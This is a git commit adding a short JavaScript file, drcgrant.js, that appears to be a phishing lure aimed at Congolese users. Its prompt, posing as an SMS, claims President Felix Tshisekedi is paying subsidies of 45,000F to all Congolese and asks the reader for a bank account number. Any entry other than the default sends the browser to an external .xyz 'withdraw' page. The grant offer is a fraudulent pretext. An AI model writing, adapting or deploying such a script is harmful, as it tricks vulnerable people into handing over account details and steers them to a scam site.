690afea5371851a6c0bd039e1a488f3071d7446f
bigetijazz31 <bigetijazz31@gmail.com>
2025-05-24 17:49:41 +0100

    Create drcgrant.js

---
+++ drcgrant.js
@@ -0,0 +1,6 @@
+
+var password = 'Retirer 45,000F'
+password=prompt('SMS : Bonjour cher, veuillez saisir votre numéro de compte pour retirer les subventions Felix Tshisekedi pour tous les congolais. to Retirer 45,000F, appuyez sur OK pour retirer maintenant','Retirer 45,000F');
+if (password != 'Retirer 45,000F') {
+location.href='https://www.oldmtn50gb.xyz/withdraw-45000F';
+}
